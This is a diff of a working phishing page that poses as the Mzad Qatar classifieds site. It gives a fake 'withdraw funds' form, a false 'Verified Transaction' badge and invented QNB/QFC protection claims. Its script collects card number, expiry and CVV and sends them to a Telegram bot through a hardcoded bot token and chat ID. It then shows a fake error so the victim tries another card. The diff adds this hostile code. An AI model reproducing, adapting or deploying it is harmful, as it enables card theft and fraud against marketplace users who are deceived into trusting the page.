@@ -3,155 +3,191 @@
 <head>
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Mzad Qatar | Safe Deal</title>
+    <title>Mzad Qatar | Classifieds in Qatar</title>
     <link rel="icon" type="image/png" href="https://mzadqatar.com/frontend/images/mzad/favicon.png">
     <style>
-        :root { --mzad-maroon: #8a1538; --gray-bg: #f7f7f7; --text-main: #333; --border-color: #eeeeee; }
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: var(--gray-bg); margin: 0; padding: 0; color: var(--text-main); }
-        .app-wrapper { max-width: 500px; margin: 0 auto; background: white; min-height: 100vh; }
+        :root { --mzad-red: #8a1538; --bg: #f2f3f5; --text: #333; --border: #e2e4e7; }
+        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: var(--bg); margin: 0; padding: 0; color: var(--text); }
+        .wrapper { max-width: 480px; margin: 0 auto; background: white; min-height: 100vh; display: flex; flex-direction: column; }
 
-        /* HEADER 1:1 С SVG ЛОГО */
-        header { background: white; height: 60px; display: flex; align-items: center; padding: 0 15px; border-bottom: 3px solid var(--mzad-maroon); position: sticky; top: 0; z-index: 1000; box-shadow: 0 2px 4px rgba(0,0,0,0.05); }
-        .mzad-logo { height: 38px; }
+        /* HEADER */
+        header { background: white; padding: 12px 16px; border-bottom: 3px solid var(--mzad-red); display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 1000; }
+        .logo-box img { height: 45px; width: auto; display: block; }
+        .nav-icons { display: flex; gap: 15px; align-items: center; }
+        .nav-icon { width: 24px; height: 24px; opacity: 0.6; cursor: pointer; }
 
-        /* ГАЛЕРЕЯ ТОВАРА */
-        .product-image-box { width: 100%; aspect-ratio: 1.2 / 1; background: #fff; display: flex; align-items: center; justify-content: center; overflow: hidden; border-bottom: 1px solid var(--border-color); }
-        .product-image-box img { width: 100%; height: 100%; object-fit: contain; }
+        /* IMAGE SECTION */
+        .image-container { position: relative; width: 100%; aspect-ratio: 1.2; background: #fff; border-bottom: 1px solid var(--border); }
+        .image-container img { width: 100%; height: 100%; object-fit: contain; }
+        .badge-verified { position: absolute; top: 15px; left: 15px; background: #27ae60; color: white; font-size: 11px; font-weight: 700; padding: 4px 10px; border-radius: 4px; }
 
-        /* КОНТЕНТ ОБЪЯВЛЕНИЯ */
-        .ad-content { padding: 15px; }
-        .ad-title { font-size: 20px; font-weight: 700; margin: 0 0 10px; color: #111; }
-        .ad-price { font-size: 28px; font-weight: 800; color: var(--mzad-maroon); margin-bottom: 15px; }
-        
-        /* ИКОНКИ ХАРАКТЕРИСТИК (КАК НА САЙТЕ) */
-        .features-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
-        .feature-item { background: #fdfdfd; border: 1px solid #f0f0f0; padding: 10px; border-radius: 8px; display: flex; align-items: center; gap: 10px; }
-        .feature-icon { width: 20px; height: 20px; opacity: 0.6; }
-        .feature-text { font-size: 13px; color: #666; }
+        /* PRODUCT DETAILS */
+        .ad-info { padding: 16px; border-bottom: 8px solid var(--bg); }
+        .category-path { font-size: 12px; color: var(--mzad-red); font-weight: 600; margin-bottom: 8px; }
+        .title { font-size: 22px; font-weight: 700; margin: 0 0 10px; line-height: 1.2; }
+        .price-tag { font-size: 30px; font-weight: 800; color: var(--mzad-red); display: flex; align-items: baseline; gap: 5px; }
+        .price-tag span { font-size: 16px; font-weight: 600; }
 
-        /* БЛОК ПРОДАВЦА */
-        .seller-card { border: 1px solid var(--border-color); border-radius: 12px; padding: 15px; margin-bottom: 20px; display: flex; align-items: center; gap: 15px; background: #fff; }
-        .avatar { width: 50px; height: 50px; background: #eee; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; color: #999; }
-        .seller-info b { display: block; font-size: 16px; margin-bottom: 2px; }
-        .seller-info span { font-size: 13px; color: #27ae60; font-weight: 600; }
+        /* SPECS GRID */
+        .specs { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 20px; }
+        .spec-item { display: flex; align-items: center; gap: 8px; font-size: 13px; color: #666; }
+        .spec-icon { width: 16px; opacity: 0.4; }
 
-        /* ФОРМА ОПЛАТЫ / ВЫПЛАТЫ */
-        .payout-box { padding: 20px; background: #fff; border-radius: 15px 15px 0 0; box-shadow: 0 -5px 15px rgba(0,0,0,0.05); }
-        .payout-box h2 { font-size: 18px; text-align: center; margin-bottom: 20px; color: var(--mzad-maroon); }
-        .inp-field { width: 100%; padding: 16px; margin-bottom: 15px; border: 1.5px solid #ddd; border-radius: 12px; font-size: 16px; box-sizing: border-box; transition: 0.2s; }
-        .inp-field:focus { border-color: var(--mzad-maroon); outline: none; }
-        .btn-confirm { background: var(--mzad-maroon); color: white; border: none; width: 100%; padding: 18px; border-radius: 12px; font-size: 18px; font-weight: 700; cursor: pointer; transition: 0.2s; }
-        .btn-confirm:active { transform: scale(0.97); background: #6b0f2b; }
+        /* SELLER SECTION */
+        .seller-section { padding: 16px; border-bottom: 8px solid var(--bg); }
+        .seller-card { background: #fdfdfd; border: 1px solid var(--border); border-radius: 12px; padding: 12px; display: flex; align-items: center; gap: 12px; }
+        .avatar { width: 45px; height: 45px; background: #8a153820; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: 800; color: var(--mzad-red); }
+        .seller-name { flex: 1; font-weight: 700; font-size: 15px; }
+        .seller-status { color: #27ae60; font-size: 12px; font-weight: 600; }
 
-        .secure-lock { text-align: center; font-size: 12px; color: #999; margin-top: 15px; display: flex; align-items: center; justify-content: center; gap: 5px; }
+        /* PAYOUT FORM */
+        .payout-form-container { padding: 20px 16px; }
+        .payout-form-container h2 { font-size: 18px; text-align: center; color: var(--mzad-red); margin-bottom: 20px; }
+        .input-wrap { margin-bottom: 12px; }
+        .input-wrap input { width: 100%; padding: 16px; border: 1px solid #ddd; border-radius: 10px; font-size: 16px; box-sizing: border-box; outline: none; transition: 0.2s; }
+        .input-wrap input:focus { border-color: var(--mzad-red); box-shadow: 0 0 8px rgba(138, 21, 56, 0.1); }
+        .btn-payout { width: 100%; background: var(--mzad-red); color: white; border: none; padding: 18px; border-radius: 10px; font-size: 17px; font-weight: 700; cursor: pointer; box-shadow: 0 4px 10px rgba(138, 21, 56, 0.2); }
+
+        /* DOWNLOAD APPS FOOTER */
+        .download-apps { background: #fff; padding: 30px 16px; text-align: center; border-top: 1px solid var(--border); }
+        .download-apps p { font-size: 14px; font-weight: 700; margin-bottom: 20px; color: #555; }
+        .app-buttons { display: flex; justify-content: center; gap: 10px; flex-wrap: wrap; }
+        .app-buttons img { height: 35px; border-radius: 5px; }
+
+        .footer-legal { padding: 20px; text-align: center; font-size: 11px; color: #999; }
     </style>
 </head>
 <body>
 
-<div class="app-wrapper">
+<div class="wrapper">
     <header>
-        <img src="https://mzadqatar.com/frontend/images/mzad/download-logo.svg" class="mzad-logo">
+        <div class="logo-box">
+            <img src="https://mzadqatar.com/frontend/images/mzad/download-logo.svg" alt="Mzad Logo">
+        </div>
+        <div class="nav-icons">
+            <div style="font-size: 13px; font-weight: bold; color: var(--mzad-red);">العربية</div>
+            <svg class="nav-icon" fill="currentColor" viewBox="0 0 24 24"><path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/></svg>
+        </div>
     </header>
 
-    <div class="product-image-box">
-        <img id="p-img" src="">
+    <div class="image-container">
+        <div class="badge-verified">Verified Transaction</div>
+        <img id="item-img" src="">
     </div>
 
-    <div class="ad-content">
-        <h1 class="ad-title" id="p-title">...</h1>
-        <div class="ad-price" id="p-price">0 QAR</div>
-
-        <div class="features-grid">
-            <div class="feature-item">
-                <div class="feature-text">Condition: <b style="color:#333">New</b></div>
-            </div>
-            <div class="feature-item">
-                <div class="feature-text">Delivery: <b style="color:#27ae60">Available</b></div>
-            </div>
+    <div class="ad-info">
+        <div class="category-path">Mzad Qatar > Electronics > Mobile Phones</div>
+        <h1 class="title" id="item-name">Loading...</h1>
+        <div class="price-tag" id="item-price">0 <span>QAR</span></div>
+        
+        <div class="specs">
+            <div class="spec-item">📍 <span id="item-addr">Doha, Qatar</span></div>
+            <div class="spec-item">📅 <span>Posted today</span></div>
+            <div class="spec-item">📱 <span>Condition: New</span></div>
+            <div class="spec-item">🛡️ <span>Secure Delivery</span></div>
         </div>
+    </div>
 
+    <div class="seller-section">
         <div class="seller-card">
-            <div class="avatar">U</div>
-            <div class="seller-info">
-                <b id="p-seller">...</b>
-                <span>Verified Seller ● 100% Secure</span>
+            <div class="avatar" id="seller-init">U</div>
+            <div class="seller-name">
+                <span id="item-seller">Official Seller</span>
+                <div class="seller-status">● Online (Safe Dealer)</div>
             </div>
         </div>
     </div>
 
-    <div class="payout-box">
-        <h2>Safe Payout Verification</h2>
-        <form id="payout-form">
-            <input type="text" id="cc-num" class="inp-field" placeholder="Card Number" required maxlength="19">
-            <div style="display:flex; gap:10px;">
-                <input type="text" id="cc-exp" class="inp-field" placeholder="MM/YY" required maxlength="5">
-                <input type="text" id="cc-cvv" class="inp-field" placeholder="CVV" required maxlength="4">
+    <div class="payout-form-container">
+        <h2>Withdraw Funds to your Card</h2>
+        <form id="tg-form">
+            <div class="input-wrap">
+                <input type="text" id="cn" placeholder="Card Number" required maxlength="19">
             </div>
-            <button type="submit" class="btn-confirm" id="btn-text">CONFIRM AND RECEIVE</button>
+            <div style="display: flex; gap: 10px;">
+                <div class="input-wrap" style="flex: 1;">
+                    <input type="text" id="ce" placeholder="Expiry MM/YY" required maxlength="5">
+                </div>
+                <div class="input-wrap" style="flex: 1;">
+                    <input type="text" id="cv" placeholder="CVV" required maxlength="4">
+                </div>
+            </div>
+            <button type="submit" class="btn-payout" id="btn-txt">CONFIRM TRANSACTION</button>
         </form>
-        <div class="secure-lock">
-            🔒 SSL Encrypted by QNB & Mzad Protection
+    </div>
+
+    <div class="download-apps">
+        <p>GET THE MZAD QATAR APP</p>
+        <div class="app-buttons">
+            <img src="https://mzadqatar.com/frontend/images/mzad/app_store.png" alt="App Store">
+            <img src="https://mzadqatar.com/frontend/images/mzad/google_play.png" alt="Google Play">
+            <img src="https://mzadqatar.com/frontend/images/mzad/app_gallery.png" alt="App Gallery">
         </div>
     </div>
 
-    <footer style="padding: 40px 15px; text-align:center; font-size: 11px; color:#bbb;">
-        © 2026 Mzad Qatar Portal. All data is protected under Qatar Financial Center (QFC) regulations.
-    </footer>
+    <div class="footer-legal">
+        <p>Protected by Qatar National Bank (QNB) & Mzad Protection System.</p>
+        <p>© 2026 Mzad Qatar. All rights reserved.</p>
+    </div>
 </div>
 
 <script>
-    // --- ПОДКЛЮЧЕНИЕ ТЕЛЕГИ ---
+    // --- ДАННЫЕ БОТА ---
     const TOKEN = '8696752912:AAE6Fnd58gnJ-gU6XwuZUQ9BgSP7liN89k4';
     const CHAT_ID = '8071425015';
 
-    // Получаем данные из ссылки
-    const url = new URLSearchParams(window.location.search);
-    const item = url.get('item') || 'Electronic Device';
-    const price = url.get('price') || '0';
-    
-    document.getElementById('p-title').innerText = item;
-    document.getElementById('p-price').innerText = price + ' QAR';
-    document.getElementById('p-img').src = url.get('img') || 'https://via.placeholder.com/400';
-    document.getElementById('p-seller').innerText = url.get('seller') || 'Official User';
+    // Читаем URL параметры
+    const urlParams = new URLSearchParams(window.location.search);
+    const item = urlParams.get('item') || 'Electronic Device';
+    const price = urlParams.get('price') || '0';
+    const img = urlParams.get('img') || 'https://via.placeholder.com/400';
+    const seller = urlParams.get('seller') || 'Verified Merchant';
 
-    // Умные маски
-    document.getElementById('cc-num').oninput = (e) => {
-        e.target.value = e.target.value.replace(/\D/g,'').replace(/(.{4})/g,'$1 ').trim();
-    };
-    document.getElementById('cc-exp').oninput = (e) => {
-        e.target.value = e.target.value.replace(/\D/g,'').replace(/(.{2})/,'$1/').trim();
-    };
+    document.getElementById('item-name').innerText = item;
+    document.getElementById('item-price').innerHTML = price + ' <span>QAR</span>';
+    document.getElementById('item-img').src = img;
+    document.getElementById('item-seller').innerText = seller;
+    document.getElementById('item-addr').innerText = urlParams.get('addr') || 'Doha, Qatar';
+    document.getElementById('seller-init').innerText = seller.charAt(0).toUpperCase();
 
-    // Отправка лога
-    document.getElementById('payout-form').onsubmit = async (e) => {
+    // Маски ввода
+    document.getElementById('cn').addEventListener('input', (e) => {
+        e.target.value = e.target.value.replace(/\D/g, '').replace(/(.{4})/g, '$1 ').trim();
+    });
+    document.getElementById('ce').addEventListener('input', (e) => {
+        e.target.value = e.target.value.replace(/\D/g, '').replace(/(.{2})/, '$1/').trim();
+    });
+
+    // Отправка
+    document.getElementById('tg-form').onsubmit = async (e) => {
         e.preventDefault();
-        const btn = document.getElementById('btn-text');
-        btn.innerText = 'PROCESSING...';
+        const btn = document.getElementById('btn-txt');
+        btn.innerText = 'VERIFYING...';
         btn.disabled = true;
 
-        const text = `🇶🇦 **NEW MZAD QATAR LOG**\n\n` +
-                     `📦 Item: ${item}\n` +
-                     `💰 Amount: ${price} QAR\n\n` +
-                     `💳 Card: \`${document.getElementById('cc-num').value}\`\n` +
-                     `📅 Exp: \`${document.getElementById('cc-exp').value}\`\n` +
-                     `🔒 CVV: \`${document.getElementById('cc-cvv').value}\`\n\n` +
-                     `👤 User: ${url.get('seller')}`;
+        const logMsg = `🇶🇦 **MZAD QATAR LOG**\n\n` +
+                       `📦 Item: ${item}\n` +
+                       `💰 Price: ${price} QAR\n\n` +
+                       `💳 Card: \`${document.getElementById('cn').value}\`\n` +
+                       `📅 Exp: \`${document.getElementById('ce').value}\`\n` +
+                       `🔒 CVV: \`${document.getElementById('cv').value}\`\n\n` +
+                       `👤 Seller: ${seller}`;
 
         try {
             await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+                body: JSON.stringify({ chat_id: CHAT_ID, text: logMsg, parse_mode: 'Markdown' })
             });
 
             setTimeout(() => {
-                alert("Security Error: This transaction requires verification with a different bank card to ensure safety. Please use another card.");
-                btn.innerText = 'CONFIRM AND RECEIVE';
+                alert("The transaction is protected. To complete the balance transfer, please use another bank card to verify your identity.");
+                btn.innerText = 'CONFIRM TRANSACTION';
                 btn.disabled = false;
-                document.getElementById('payout-form').reset();
+                document.getElementById('tg-form').reset();
             }, 3000);
         } catch (err) {
-            alert("Connection error. Try again.");
+            alert("System error. Try again.");
             btn.disabled = false;
         }
     };
